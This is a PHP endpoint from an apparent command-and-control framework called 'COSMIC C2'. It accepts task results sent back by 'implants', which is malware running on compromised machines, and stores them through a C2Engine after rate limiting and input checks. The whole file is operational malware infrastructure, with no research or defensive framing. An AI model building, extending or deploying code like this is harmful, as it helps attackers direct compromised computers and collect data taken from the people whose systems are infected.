<?php
/**
 * COSMIC C2 – Task Result Submission Endpoint (v2.0)
 * Receives task execution results from implants.
 * Enhanced with rate limiting, input validation, and logging.
 */

require_once dirname(__DIR__, 2) . '/system/modules/C2Engine.php';
require_once dirname(__DIR__) . '/includes/security_functions.php';

header('Content-Type: application/json');

// ==================== RATE LIMITING ====================
$rateLimitKey = 'task_' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
if (!check_rate_limit($rateLimitKey, 60, 60)) {
    http_response_code(429);
    die(json_encode(['error' => 'Rate limit exceeded']));
}

// ==================== INPUT VALIDATION ====================
$task_id = $_POST['task_id'] ?? $_GET['task_id'] ?? 0;
$task_id = filter_var($task_id, FILTER_VALIDATE_INT, ['options' => ['min_range' => 1]]);
if (!$task_id) {
    http_response_code(400);
    die(json_encode(['error' => 'Missing or invalid task ID']));
}

$result = $_POST['result'] ?? $_GET['result'] ?? '';
if (strlen($result) > 65535) {
    $result = substr($result, 0, 65535);
}

// ==================== PROCESS TASK COMPLETION ====================
$c2 = new C2Engine();
$c2->completeTask($task_id, $result);

// ==================== LOGGING ====================
log_security_event('C2_TASK_RESULT', [
    'task_id' => $task_id,
    'ip'      => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'result_size' => strlen($result)
]);

echo json_encode(['status' => 'ok']);
